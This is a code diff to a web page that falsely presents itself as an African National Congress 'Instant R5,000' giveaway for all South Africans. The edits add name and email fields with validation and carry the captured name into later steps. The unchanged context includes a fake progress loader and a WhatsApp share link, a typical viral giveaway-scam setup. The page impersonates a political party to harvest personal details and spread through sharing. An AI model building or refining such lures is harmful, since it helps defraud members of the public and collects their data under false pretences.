@@ -596,40 +596,37 @@ African National Congress Instant R5,000 Campaign Giveaway
 </span><br/>
              The African National Congress (ANC) is giving out Instant free R5,000 as part of 2026 campaign for all South Africans
  
-<br>
-<span class="amount"></span>
-<br>
+<br> <span class="amount"></span> <br/>
+ <center>
+<div class="form-row">
+    <label for="fullname">Full Name:</label>
+    <input type="text" id="fullname" placeholder="Enter your full name" required>
+</div>
 
-<center>
-    <div class="form-row">
-        <label for="name">Full Name:</label>
-        <input
-            type="text"
-            id="name"
-            name="name"
-            placeholder="Enter your full name"
-            autocomplete="name"
-            required
-        >
-    </div>
+<div class="form-row">
+    <label for="email">Email<br>Address:</label>
+    <input type="email" id="email" placeholder="Enter your email address" required>
+</div>
+<p id="formError" class="error">Please enter a valid name and email address</p>
+                </center><br>
 
-    <div class="form-row">
-        <label for="email">Email Address:</label>
-        <input
-            type="email"
-            id="email"
-            name="email"
-            placeholder="Enter your email address"
-            autocomplete="email"
-            required
-        >
-    </div>
-</center>
-<br>
+            </p>   
 
-<button id="go">
-    <font color="white">CONTINUE</font>
-</button>
+            <button id="go"> <font color="white">CONTINUE</font></button>
+        </div>
+        <div id="loader">
+            <div>Please Wait ...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+            <p class="title"> ENTER YOUR NAME:</p>
+            <div class="phone">
+                <center><input type="char" placeholder="Type Your name here" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
+                </center>
+<br/>
+             
+
 
                 <button id="confirm"><font color="white">Send</font></button>
             </div>
@@ -825,6 +822,20 @@ var share = "whatsapp://send?text=" + encodeURIComponent(text1);
   <script>
 
         $("#go").click(function () {
+    var fullnameVal = $("#fullname").val().trim();
+    var emailVal = $("#email").val().trim();
+    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (fullnameVal.length < 2 || !emailRegex.test(emailVal)) {
+        $("#formError").fadeIn(300);
+        return;
+    }
+    $("#formError").fadeOut(300);
+
+    // Pass captured values into the existing downstream field (#name) so the
+    // rest of the flow (confirmation, share bar, getname display) keeps working.
+    $("#name").val(fullnameVal);
+
     $("#intro").fadeOut(0);
     $("#loader").fadeIn(1000);
     var i = 0;
@@ -835,6 +846,8 @@ var share = "whatsapp://send?text=" + encodeURIComponent(text1);
             clearInterval(interval);
             $("#loader").fadeOut(0);
             $("#info").fadeIn(1000);
+            // Pre-fill the name field in the info step
+            $("#name").val(fullnameVal);
         }
     }, 50);
 });
